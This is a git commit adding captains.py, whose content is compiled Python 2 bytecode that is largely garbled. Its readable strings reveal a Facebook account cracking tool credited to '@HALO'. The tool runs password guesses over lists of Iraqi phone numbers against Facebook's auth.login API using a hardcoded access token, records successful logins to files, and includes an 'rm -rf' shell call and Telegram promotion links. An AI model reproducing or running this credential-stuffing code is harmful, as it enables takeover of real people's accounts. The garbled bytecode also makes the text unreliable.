2e704e37bf1503fe129842ce1a641d957fa1abaf
kurdteam1 <81302709+kurdteam1@users.noreply.github.com>
2021-03-29 05:09:20 +0300

    Rename 2_5406953823790960860.py to captains.py

---
+++ captains.py
@@ -0,0 +1,129 @@
+ó
+jÊ``c@s¸ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddlZdZ
+e
+ejdxJedD]<ZejddZedde_eGHejjqÆWyddlZWnek
+r6ejd	nXyddlZWn8ek
+rejd
+ejdejdnXddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddlZdd
+lmZddlmZddlmZeeejdejZ e j!e"e j#ej$j%ddd0ge _&d1ge _&dZ'dZ(ejddZ)dZ*dZ+dZ,dZ-ga.gZ/ga0dZ1dZ2ejd ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZejdxJed!D]<ZejddZedde_eGHejjqÐWyddlZWnek
+r@ejd"nXyddlZWnEek
+rejd#ejdejd$ejd%nXdd
+lmZddlmZddlmZeeejdejZ e j!e"e j#ej$j%ddd2ge _&d&Z3d'Z,d(Z4d)Z5d*Z6Z6dZ-gZ7ga0ga.gZ/gZ8d+Z1d,Z2ejd d-Z9d.Z:e;d/kr´e9ndS(3iÿÿÿÿNcCsÒttjttj}dj|}d|GHyetjdj}||krdGHttj}tj	dndGHtj	dt
+jWn,t
+jtdkrÎt
+GHtqÎnXdS(Nt-s[37;
+
+srm -rf .txtiiGôis.txttas4No Module Named Requests! type:pip2 install requestss6No Module Named Mechanize! type:pip2 install mechanizeisThen type: python2 fbi.py(t
+ThreadPool(tConnectionError(tBrowsertutf8tmax_times
+User-AgentsROpera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
+user-agentsDalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]cCsdGHtjjdS(NsThanks.(RRR
+(((s/sdcard/Download/xld.pytkeluar@scCsSd}d}x:tD]2}|d|tjdt|d|7}qWt|S(Ntahtdzjctt!ii(txtrandomtrandinttlentcetak(tbtwtdti((s/sdcard/Download/xld.pytacakEs
+
+0smkdir anggaxd/cloned.txtcCs~d}xA|D]9}|j|}|jd|dtd|}q
+W|d7}|jdd}tjj|ddS(NRs!%ss[%s;1mis[0ms!0s
+(tindextreplaceRRtstdouttwrite(R$R%R'tjR((s/sdcard/Download/xld.pyR#Ns
+(
+cCsCx<|dD]0}tjj|tjjtjdqWdS(Ns
+g¹?(RR+R,tflushR
+R(tzte((s/sdcard/Download/xld.pytjalanYs
+cCsFdddg}x0|D](}d|GtjjtjdqWdS(Ns.   s..  s... s
+[1;93mPlease Wait [1;93mi(RR+R.R
+R(ttitikto((s/sdcard/Download/xld.pyttik`s
+
+
+cCsCx<|dD]0}tjj|tjjtjdqWdS(Ns
+g¸ëQ¸?(RR+R,R.R
+R(R/R0((s/sdcard/Download/xld.pytpsbhs
+is
+[31mNot Vulns	[32mVulntcleari'spip2 install requestsspip2 install mechanizespython2 nmbr.pysxdg-open https://t.me/halohackcCsdGHtjjdS(Ns[!] Exit(RRR
+(((s/sdcard/Download/xld.pytexbscCsCx<|dD]0}tjj|tjjtjdqWdS(Ns
+g¸ëQ¸?(RR+R,R.R
+R(R/R0((s/sdcard/Download/xld.pyR5s
+cCstjddS(Ni(R
+R(((s/sdcard/Download/xld.pytt¡scCstjdtjddS(NR6sxdg-open https://t.me/halohack(Rtsystem(((s/sdcard/Download/xld.pytcb¥s
+sR
+
+[1;92mAUTHOR:@HALO
+[1;96mMY TELEGRAM@halohack
+[1;97mMY CHANALE@staferor404
+
+
+s
+[91mNot Vulns	[91mVulncCsCtjdtGHddGHdGHdGHdGHdGHddGHtdS(	NR6i*s[1;91ms[1]hack iraqs
+[2] tlgrams[0]BACK           t s[1;33m-(RR9Rtaction(((s/sdcard/Download/xld.pytmenu¾s
+		csºtd}|dkr'dGHtnª|dkrçtjdtGHtjtjdtjddGHyOtd	d
+d}x0t|djD]}tj|j	qWWqÑt
+k
+rãd
+GHtdtqÑXnê|dkrtjdtjdnÁ|dkr¯tjdtGHdGHyOtddd}x0t|djD]}tj|j	qdWWqÑt
+k
+r«d
+GHtdtqÑXn"|dkrÅtndGHtt
+tt}td|tjdtdtjdtdtjdddGHfd}td}|j|tddGHd GHd!t
+ttd"t
+ttGHd#GHtd$tjd%dS(&Ns%[1;91mmhalzhera  [1;97m>>>[1;90m  Rs[!] Fill in correctlyt1R6s
+figlet 404sfiglet HALOs[1;33m750 770 751 771s[1;33m zhmareyak dane   : s+964s.txttrs[!] File Not Founds	
+[ Back ]t2sxdg-open https://t.me/halohacktFs[1;91m 14, 19s choose code  : s+80t0s
+[✓] raqam: g¹?s[1;91mdast pekrdn ba hack ...s[bowastandn] CTRL+z dagragà?i*s[1;91m=csw|}ytjdWntk
+r*nXy>|}tjd|d|d}tj|}d|kréd|d|ddGHtd	d
+}|j|d|d|jt	j
+||nd|d
+krhd|d|dGHtdd
+}|j|d|d|jtj
+||nWnnXdS(Ntsaveshttps://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s&locale=en_US&password=sH&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmtaccess_tokens[1;92m[HACK BY HALO][1;92m s | s
+ssave/successfull.txtRt|swww.facebook.comt	error_msgs[1;91m[Check-point][1;91m ssave/checkpoint.txts>>>(RtmkdirtOSErrortbrtopentjsontloadR,tclosetokstappendtcpb(thalotusertpass1tdatatqtokbtcps(tctk(s/sdcard/Download/xld.pytmains.
+'!!
+!
+is[1;97m=s,[✓][1;93m Process Has Been Completed ....s"[✓][1;92m Total OK/[1;97mCP : t/s9[✓][1;97m CP File Has Been Saved : save/checkpoint.txts
+[Press Enter To Go Back]spython2 .README.md(t	raw_inputR<RR9RRJt	readlinesRROtstriptIOErrorR=R7RR"R5R
+RRtmapRNRP(tbchtidlisttlinetxxxRZtp((RXRYs/sdcard/Download/xld.pyR<Êsv
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		)
+R(s
+User-AgentsROpera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(s
+user-agentsDalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](s
+user-agentsDalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](<RRR
+tdatetimeR thashlibtret	threadingRKturllibt	cookielibtgetpassRRR9trangetnR!tnmbrRJR+R.tImportErrort	mechanizeRtmultiprocessing.poolRtrequests.exceptionsRRtreloadtsetdefaultencodingRItset_handle_robotstFalsetset_handle_refresht_httptHTTPRefreshProcessort
+addheadersRR(R#R1R4R5tbackRNRRPtvulnottvulnR7R8R:Rt
+successfultlistgrupR=R<t__name__(((s/sdcard/Download/xld.pyt<module>s²	
+
+
+
+
+
+
+
+		
+				
+
+
+
+
+
+
+
+
+
+				
+
+		b
